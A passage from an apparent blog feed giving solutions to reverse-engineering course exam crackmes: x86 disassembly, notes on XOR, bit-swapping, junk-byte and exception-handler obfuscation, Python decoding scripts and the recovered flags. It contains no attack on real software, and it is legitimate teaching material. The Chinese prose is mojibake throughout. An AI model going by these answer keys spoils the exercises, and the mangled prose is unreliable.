å¯†å¾—åˆ°çš„ï¼Œæˆ‘ä»¬å–å‡ºbyte_42C700å‰12ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯†ï¼Œå³æˆ‘ä»¬ä¹‹å‰æ±‚å¾—çš„<code>NetworkClass</code>ï¼Œbyte_42C700çš„ç¬¬13ä¸ªå­—èŠ‚ä¸º0x0ï¼Œæˆ‘ä»¬å°†å®ƒä¸byte_42C600ç¬¬ä¸€ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œæ±‚å¾—æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ç¬¬13ä¸ªå­—ç¬¦åº”è¯¥ä¸º<code>N</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_411CCB:</span><br><span class="line">cmp     [ebp+var_25C], 13h</span><br><span class="line">jge     short loc_411D16</span><br><span class="line">mov     edx, [ebp+var_25C]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte ptr [ebp+edx+var_1F4]</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42C700[ecx]</span><br><span class="line">cmp     eax, edx</span><br><span class="line">jz      short loc_411D14</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œå¾—åˆ°flagä¸º<code>NetworkClassN</code>ã€‚</p><h2 id="cpp-2">cpp.2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea     edx, [ebp+var_444]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_454], eax</span><br><span class="line">cmp     [ebp+var_454], 5</span><br><span class="line">jnb     short loc_401D56</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥é•¿åº¦ä¸ºå¤§äºç­‰äº5ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_450]</span><br><span class="line">movsx   eax, [ebp+edx+var_444]</span><br><span class="line">cmp     eax, 41h</span><br><span class="line">jl      short loc_401DA5</span><br><span class="line">mov     ecx, [ebp+var_450]</span><br><span class="line">movsx   edx, [ebp+ecx+var_444]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jle     short loc_401DBF</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥çš„å­—ç¬¦å†0x41åˆ°0x7Açš„èŒƒå›´å†…ï¼ŒåŒ…å«äº†å¤§å°å†™å­—æ¯å’Œéƒ¨åˆ†ç‰¹æ®Šç¬¦å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdata:0042801C dword_42801C    dd 428A2F98h</span><br><span class="line">.rdata:00428020                 db  91h ; </span><br><span class="line">.rdata:00428021                 db  44h ; D</span><br><span class="line">.rdata:00428022                 db  37h ; 7</span><br><span class="line">.rdata:00428023                 db  71h ; q</span><br></pre></td></tr></table></figure><p>å¯çŸ¥ä¸ºSHA-256ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    4</span><br><span class="line">lea     eax, [ebp+var_444]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     ecx, [ebp+var_44C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>è¯´æ˜åªå¯¹å‰å››ä¸ªå­—èŠ‚è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_450]</span><br><span class="line">movsx   ecx, [ebp+eax+var_44]</span><br><span class="line">add     ecx, 1</span><br><span class="line">mov     edx, [ebp+var_450]</span><br><span class="line">mov     [ebp+edx+var_44], cl</span><br><span class="line">jmp     short loc_401E08</span><br></pre></td></tr></table></figure><p>ä¼šå¯¹æ‰€å¾—å¯†æ–‡çš„æ¯ä¸€ä½è¿›è¡ŒåŠ 1æ“ä½œã€‚<br>æ‰€å¾—ç»“æœä¸<code>1f2e28649c4g:25:8bb:24c3D3EGF6GFg22dff</code>è¿›è¡Œæ¯”è¾ƒã€‚<br>è§£çš„å‰4å­—èŠ‚ä¸º<code>Seey</code>ï¼Œåé¢éœ€æ·»åŠ è‡³å°‘ä¸€ä¸ªç¬¦åˆè¾“å…¥èŒƒå›´è¦æ±‚çš„å­—ç¬¦ã€‚</p><h2 id="cpp-3">cpp.3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     ecx, [ebp+var_14]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_18], eax</span><br><span class="line">cmp     [ebp+var_18], 8</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥é•¿åº¦ä¸º8ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_14]</span><br><span class="line">and     edx, 7Eh</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">and     ecx, 80h</span><br><span class="line">sar     ecx, 7</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">and     ecx, 1</span><br><span class="line">shl     ecx, 7</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_14], dl</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_14]</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, byte_429A38[eax]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_14], dl</span><br><span class="line">jmp     short loc_401085</span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘æ˜¯å–å‡ºæ¯ä¸€å­—èŠ‚çš„æœ€é«˜ä½å’Œæœ€ä½ä½ï¼Œå¯¹ä¸¤ä¸ªä½è¿›è¡Œå¯¹è°ƒï¼Œå†ä¸byte_429A38è¿›è¡Œå¼‚æˆ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, byte_429A30[edx]</span><br></pre></td></tr></table></figure><p>æ‰€å¾—ç»“æœä¸byte_429A30è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte_429A38ä¸º0x6,0x7,0x8,0x9,0x0A,0x0B,0x0C,0x0D</span><br><span class="line">byte_429A30ä¸º0x52,0x0C7,0x0C2,0x0CD,0x0EE,0x0EB,0x0FE,0x0F5</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—flagä¸º<code>TAKEeasy</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x6</span>,<span class="number">0x7</span>,<span class="number">0x8</span>,<span class="number">0x9</span>,<span class="number">0x0A</span>,<span class="number">0x0B</span>,<span class="number">0x0C</span>,<span class="number">0x0D</span>]</span><br><span class="line">b = [<span class="number">0x52</span>,<span class="number">0x0C7</span>,<span class="number">0x0C2</span>,<span class="number">0x0CD</span>,<span class="number">0x0EE</span>,<span class="number">0x0EB</span>,<span class="number">0x0FE</span>,<span class="number">0x0F5</span>]</span><br><span class="line">c = []</span><br><span class="line">mid = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">mid = a[i]^b[i]</span><br><span class="line">mid = ((mid &amp; <span class="number">0x80</span>) &gt;&gt; <span class="number">7</span>) | ((mid &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">7</span>) | (mid &amp; <span class="number">0x7E</span>)</span><br><span class="line">c.append(<span class="built_in">chr</span>(mid))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><h2 id="cpp-4">cpp.4</h2><p>ç®€å•çš„èŠ±æŒ‡ä»¤ã€‚ä¸»è¦æ˜¯æˆ‘æ¯”è¾ƒSBï¼Œè„‘å­æŠ½äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmp     dword ptr [ebp-8], 0Eh</span><br><span class="line">jge     short loc_4010F5</span><br><span class="line">mov     ecx, [ebp-8]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42CCBC[ecx]</span><br><span class="line">xor     edx, 0FFh</span><br><span class="line">mov     eax, [ebp-8]</span><br><span class="line">mov     byte_42CCBC[eax], dl</span><br><span class="line">mov     ecx, [ebp-8]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42CCBC[ecx]</span><br><span class="line">mov     eax, [ebp-8]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, byte_429A30[eax]</span><br><span class="line">sub     edx, ecx</span><br><span class="line">mov     eax, [ebp-4]</span><br><span class="line">add     eax, edx</span><br><span class="line">mov     [ebp-4], eax</span><br><span class="line">jmp     short loc_4010AA</span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘æ˜¯å°†42CCBCå¤„ï¼ˆæ ¹æ®å‰é¢çš„ä»£ç å¯ä»¥å¾ˆå®¹æ˜“çš„åˆ†æå‡ºè¿™é‡Œå­˜å‚¨çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼‰å…ˆå–åï¼ˆä¸0xFFå¼‚æˆ–çš„ç­‰ä»·æ“ä½œï¼Œæˆ‘åˆ†æçš„æ—¶å€™æ²¡æœ‰çœ‹åˆ°ï¼‰ä¸429A30å¤„å­—ç¬¦ä¸²ç›¸å‡ã€‚å°†ç»“æœå­˜å…¥var_4ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">429A30å¤„å­—ç¬¦ä¸²ä¸º0xBD,0x9A,0x9E,0x8B,0xD5,0xCF,0x92,0x96,0x9C,0x8D,0x90,0x91,0xD5,0xDE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> loc_4010F5:</span><br><span class="line">.text:004010F5 33 C0              xor     eax, eax</span><br><span class="line">.text:004010F7 74 03              jz      short near ptr loc_4010FB+1</span><br><span class="line">.text:004010F9 75 00              jnz     short $+2</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB  loc_4010FB:</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB E9 83 7D FC 00     jmp     near ptr 13C8E83h</span><br></pre></td></tr></table></figure><p>0x4010FBå¤„jmpæŒ‡ä»¤æŒ‡å‘ä¸€ä¸ªæ— æ•ˆåœ°å€ã€‚0x4010F7çš„jzæŒ‡ä»¤æ˜¯è·³è½¬åˆ°0x4010FBçš„ä¸‹ä¸€å­—èŠ‚ï¼Œå› ä¸ºxor eax,eaxè¯­å¥è®¡ç®—ç»“æœæ’ä¸ºé›¶ï¼Œæ‰€ä»¥jzè·³è½¬ä¸€å®šä¼šå‘ç”Ÿï¼Œè€Œæˆ‘ä»¬ç¨‹åºæ‰§è¡Œç»“æœä¸å˜çš„æƒ…å†µä¸‹ï¼Œå¾ˆå®¹æ˜“çœ‹å‡º0x4010FBå¤„çš„ä¸€ä¸ªå­—èŠ‚æ˜¯åƒåœ¾æ•°æ®ï¼Œåªéœ€è¦å°†å…¶nopæ‰å³å¯ã€‚æˆ‘ä»¬ç›´æ¥é€šè¿‡Patchå°†0x4010FBå¤„çš„ä¸€ä¸ªå­—èŠ‚ä¿®æ”¹ä¸º90ï¼Œä»è€Œå°†å…¶ä¿®æ”¹ä¸ºnopã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:004010F5 33 C0         xor     eax, eax</span><br><span class="line">.text:004010F7 74 03         jz      short loc_4010FC</span><br><span class="line">.text:004010F9 75 00         jnz     short $+2</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB                         </span><br><span class="line">loc_4010FB:</span><br><span class="line">.text:004010FB 90            nop</span><br><span class="line">.text:004010FC</span><br><span class="line">.text:004010FC                         </span><br><span class="line">loc_4010FC:</span><br><span class="line">.text:004010FC 83 7D FC 00   cmp     dword ptr [ebp-4], 0</span><br><span class="line">.text:00401100 75 0F         jnz     short loc_401111</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„ä»£ç å¦‚ä¸Šã€‚å¯¹äº<code>cmp     dword ptr [ebp-4], 0</code>è¿™æ¡è¯­å¥ï¼Œæˆ‘æœ¬æ¥å‡†å¤‡ç›´æ¥çˆ†ç ´ï¼Œåæ¥å‘ç°å­—ç¬¦ä¸²ç›´æ¥å–åå°±è¡Œäº†ï¼ˆä¹ï¼‰ã€‚<br>flagä¸º<code>Beat*0micron*!</code>ã€‚</p><h2 id="cpp-5">cpp.5</h2><p>å¦‚æœç”¨idaçš„graph viewå¾ˆå®¹æ˜“çœ‹å‡ºæ˜¯å¼‚å¸¸å¤„ç†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">loc_4014AC:</span><br><span class="line">cmp     [ebp+var_1C], 5</span><br><span class="line">jge     short loc_4014F6</span><br><span class="line">loc_4014F6:</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">mov     ecx, [ebp+var_1C]</span><br><span class="line">sub     ecx, 5</span><br><span class="line">mov     eax, 1</span><br><span class="line">cdq</span><br><span class="line">idiv    ecx</span><br><span class="line">test    eax, eax</span><br><span class="line">jz      short loc_40151E</span><br></pre></td></tr></table></figure><p>jgeè¿›è¡Œè·³è½¬ï¼Œå½“jgeåˆæ¬¡è·³è½¬æ—¶ï¼Œvar_1Cå¤„å€¼ä¸º5ï¼Œecxå‡å»5åä¸º0ï¼Œè°ƒç”¨é™¤æ³•æŒ‡ä»¤ä¼šå‡ºç°é™¤é›¶å¼‚å¸¸ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_14]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">cmp     eax, 61h</span><br><span class="line">jl      short loc_4013A4</span><br><span class="line">mov     ecx, [ebp+var_14]</span><br><span class="line">movsx   edx, byte_42CD78[ecx]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jg      short loc_4013A4</span><br><span class="line">mov     [ebp+var_18], 61h</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">movsx   ecx, byte_42CD78[eax]</span><br><span class="line">sub     ecx, [ebp+var_18]</span><br><span class="line">mov     [ebp+var_1C], ecx</span><br><span class="line">mov     eax, [ebp+var_1C]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_1C], edx</span><br><span class="line">mov     edx, [ebp+var_1C]</span><br><span class="line">add     edx, [ebp+var_18]</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">mov     byte_42CD78[eax], dl</span><br><span class="line">loc_4013A4:</span><br><span class="line">mov     ecx, [ebp+var_14]</span><br><span class="line">movsx   edx, byte_42CD78[ecx]</span><br><span class="line">cmp     edx, 41h</span><br><span class="line">jl      short loc_4013FD</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">movsx   ecx, byte_42CD78[eax]</span><br><span class="line">cmp     ecx, 5Ah</span><br><span class="line">jg      short loc_4013FD</span><br><span class="line">mov     [ebp+var_18], 41h</span><br><span class="line">mov     edx, [ebp+var_14]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">sub     eax, [ebp+var_18]</span><br><span class="line">mov     [ebp+var_1C], eax</span><br><span class="line">mov     eax, [ebp+var_1C]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_1C], edx</span><br><span class="line">mov     edx, [ebp+var_1C]</span><br><span class="line">add     edx, [ebp+var_18]</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">mov     byte_42CD78[eax], dl</span><br></pre></td></tr></table></figure><p>å¼‚å¸¸å¤„ç†å‡½æ•°å†…éƒ¨é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„å­—æ¯åº”ç”¨ä»¿å°„åŠ å¯†ï¼Œå…¶ä¸­ä¹˜æ•°ï¼ˆvar_4ï¼‰ä¸º3ï¼Œvar_8ä¸º7ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_8]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">cmp     eax, dword_429A44[ecx*4]</span><br><span class="line">jz      short loc_4012AA</span><br></pre></td></tr></table></figure><p>ä¸429A44å¤„è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">429A44å¤„å­—ç¬¦ä¸²ä¸ºwohz&#123;M1hu-71-4h0-9t-h-!&#125;</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—flagä¸º<code>flag&#123;T1an-71-4a0-9e-a-!&#125;</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021é€†å‘æœŸæœ«è¯•é¢˜</title>
      <link href="/2022/07/re2021/"/>
      <url>/2022/07/re2021/</url>
      
        <content type="html"><![CDATA[<p>è¿™è¯¾çœŸçš„ä¸æ˜¯å¯†ç å­¦å—ï¼Ÿ</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1hT5ineHI-EAfWPUF6AHoyA?pwd=glqk">https://pan.baidu.com/s/1hT5ineHI-EAfWPUF6AHoyA?pwd=glqk</a><br>æå–ç ï¼šglqk</p><h2 id="cpp-1">cpp.1</h2><p>çœ‹åˆ°VirtualProtectï¼Œä¸€çœ¼hookï¼Œä¸è¿‡è¿™é¢˜è·Ÿhookæ²¡æœ‰å¤ªå¤§å…³ç³»ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">00401118  mov     byte ptr [ebp-1C], 1A</span><br><span class="line">0040111C  mov     byte ptr [ebp-1B], 0A</span><br><span class="line">00401120  mov     byte ptr [ebp-1A], 0E</span><br><span class="line">00401124  mov     byte ptr [ebp-19], 7</span><br><span class="line">00401128  mov     byte ptr [ebp-18], 11</span><br><span class="line">0040112C  mov     byte ptr [ebp-17], 7</span><br><span class="line">00401130  mov     byte ptr [ebp-16], 0D</span><br><span class="line">00401134  mov     byte ptr [ebp-15], 0</span><br><span class="line">00401138  mov     dword ptr [ebp-20], 0</span><br><span class="line">0040113F  call    00401005</span><br><span class="line">00401144  push    0042803C        ;  ASCII &quot;Please input your flag &quot;</span><br><span class="line">00401149  call    004019C0</span><br><span class="line">0040114E  add     esp, 4</span><br><span class="line">00401151  lea     eax, dword ptr [ebp-14]</span><br><span class="line">00401154  push    eax</span><br><span class="line">00401155  push    00428038        ;  ASCII &quot;%s&quot;</span><br><span class="line">0040115A  call    00401960</span><br><span class="line">0040115F  add     esp, 8</span><br><span class="line">00401162  mov     dword ptr [ebp-20], 0</span><br><span class="line">00401169  jmp     short 00401174</span><br><span class="line">0040116B  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">0040116E  add     ecx, 1</span><br><span class="line">00401171  mov     dword ptr [ebp-20], ecx</span><br><span class="line">00401174  cmp     dword ptr [ebp-20], 7</span><br><span class="line">00401178  jge     short 00401195</span><br><span class="line">0040117A  mov     edx, dword ptr [ebp-20]</span><br><span class="line">0040117D  movsx   eax, byte ptr [ebp+edx-14]</span><br><span class="line">00401182  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">00401185  movsx   edx, byte ptr [ebp+ecx-1C]</span><br><span class="line">0040118A  xor     eax, edx</span><br><span class="line">0040118C  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">0040118F  mov     byte ptr [ebp+ecx-1C], al</span><br><span class="line">00401193  jmp     short 0040116B</span><br></pre></td></tr></table></figure><p>åˆ†æå¯å¾—è¾“å…¥å­—ç¬¦ä¸²ä¸ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–ï¼Œå†ä¸ä»¥ä¸‹å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ä¸²ä¸º0x72,0x65,0x61,0x6C,0x70,0x77,0x64</span><br></pre></td></tr></table></figure><p>æ±‚è§£è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x6C</span>,<span class="number">0x70</span>,<span class="number">0x77</span>,<span class="number">0x64</span>]</span><br><span class="line">b = [<span class="number">0x1A</span>,<span class="number">0x0A</span>,<span class="number">0x0E</span>,<span class="number">0x7</span>,<span class="number">0x11</span>,<span class="number">0x7</span>,<span class="number">0xD</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">c.append(<span class="built_in">chr</span>(a[i]^b[i]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>flagä¸º<code>hookapi</code>ã€‚</p><h2 id="cpp-2">cpp.2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_1C]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_1C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+strlen], eax</span><br><span class="line">cmp     [ebp+strlen], 7</span><br><span class="line">jz      short loc_4010BC</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥ä¸º7ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, 